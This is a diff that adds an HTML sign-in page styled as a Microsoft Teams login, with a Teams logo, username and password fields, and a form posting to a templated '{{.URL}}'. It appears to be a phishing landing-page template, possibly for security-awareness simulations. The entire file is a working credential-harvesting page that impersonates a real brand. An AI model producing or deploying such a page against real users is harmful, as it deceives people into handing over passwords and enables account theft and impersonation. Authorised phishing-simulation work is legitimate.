@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Sign In</title>
+<style>
+    body {
+        font-family: Arial, sans-serif;
+        background-color: #000000;
+        margin: 0;
+        padding: 0;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        /* The image below will be the backdrop behind the login pane */
+        background-image: url(https://i.imgur.com/j7tYAMK.jpeg); 
+    }
+    .login-container {
+        background-color: #ffffff;
+        padding: 20px;
+        border-radius: 5px;
+        box-shadow: 0 0 10px rgba(0,0,0,0.1);
+        text-align: center;
+        width: 100%;
+        max-width: 400px;
+    }
+    input[type="text"], input[type="password"] {
+        width: calc(100% - 20px);
+        padding: 10px;
+        margin: 10px 0;
+        border-radius: 5px;
+        border: 1px solid #ddd;
+    }
+    .btn {
+        background-color: #565aac;
+        color: #ffffff;
+        padding: 10px 20px;
+        border: none;
+        border-radius: 5px;
+        cursor: pointer;
+        width: calc(100% - 20px);
+        font-size: 16px;
+    }
+</style>
+</head>
+<body>
+<div class="login-container">
+    <!-- Below is the Microsoft Teams Logo that sits at the top of the login page -->
+    <img src="https://i.imgur.com/uizbeJB.png" style="max-width: 200px; max-height: 100px;">
+    <form action="{{.URL}}" method="POST">
+        <input type="text" name="username" placeholder="Username" required>
+        <input type="password" name="password" placeholder="Password" required>
+        <button type="submit" class="btn">Sign In</button>
+    </form>
+</div>
+</body>
+</html>
